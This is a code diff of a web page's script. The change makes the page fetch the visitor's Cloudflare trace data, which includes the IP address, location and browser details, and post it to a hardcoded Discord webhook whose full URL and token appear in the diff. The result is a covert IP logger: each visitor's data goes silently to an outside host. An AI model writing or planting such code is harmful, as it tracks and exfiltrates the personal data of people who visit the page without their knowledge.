@@ -12,21 +12,20 @@
   }
 
   text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
-    console.log(JSON.stringify(data));
+    console.log(data)
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    const params = {
+      username: "Hi :3",
+      avatar_url: "",
+      content: data
+    }
+
+    request.send(JSON.stringify(params));
   });
-  
-  const request = new XMLHttpRequest();
-  request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
-
-  request.setRequestHeader('Content-type', 'application/json');
-
-  const params = {
-    username: "Hi :3",
-    avatar_url: "",
-    content: "hi"
-  }
-
-  request.send(JSON.stringify(params));
 //});
 </script>
 </body>
